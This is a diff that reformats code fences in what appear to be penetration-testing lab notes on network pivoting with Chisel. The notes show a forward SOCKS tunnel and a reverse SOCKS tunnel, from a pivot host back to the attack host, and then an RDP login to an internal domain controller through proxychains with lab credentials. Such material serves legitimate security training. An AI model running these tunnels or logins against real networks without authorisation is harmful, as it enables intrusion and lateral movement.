@@ -10,8 +10,7 @@ Before we can use Chisel, we need to have it on our attack host. If we do not ha
 
 #### Cloning Chisel
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
 ```
 
@@ -21,8 +20,7 @@ We will need the programming language `Go` installed on our system to build the 
 
 #### Building the Chisel Binary
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cd chisel
 go build
 ```
@@ -33,8 +31,7 @@ Once the binary is built, we can use `SCP` to transfer it to the target pivot ho
 
 #### Transferring Chisel Binary to Pivot Host
 
-```
-        shellsession
+```shellsession
  hiimeins@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
  
 ubuntu@10.129.202.64's password: 
@@ -45,8 +42,7 @@ Then we can start the Chisel server/listener.
 
 #### Running the Chisel Server on the Pivot Host
 
-```
-        shellsession
+```shellsession
 ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
 
 2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
@@ -59,8 +55,7 @@ We can start a client on our attack host and connect to the Chisel server.
 
 #### Connecting to the Chisel Server
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
 
 2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
@@ -78,8 +73,7 @@ As you can see in the above output, the Chisel client has created a TCP/UDP tunn
 
 We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ tail -f /etc/proxychains.conf 
 
 #
@@ -98,8 +92,7 @@ Now if we use proxychains with RDP, we can connect to the DC on the internal net
 
 #### Pivoting to the DC
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 
@@ -115,8 +108,7 @@ We'll start the server in our attack host with the option `--reverse`.
 
 #### Starting the Chisel Server on our Attack Host
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
 
 2022/05/30 10:19:16 server: Reverse tunnelling enabled
@@ -128,8 +120,7 @@ Then we connect from the Ubuntu (pivot host) to our attack host, using the optio
 
 #### Connecting the Chisel Client to our Attack Host
 
-```
-        shellsession
+```shellsession
 ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
 
 2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
@@ -143,8 +134,7 @@ We can use any editor we would like to edit the proxychains.conf file, then conf
 
 #### Editing & Confirming proxychains.conf
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ tail -f /etc/proxychains.conf 
 
 [ProxyList]
@@ -155,8 +145,7 @@ socks5 127.0.0.1 1080
 
 If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 
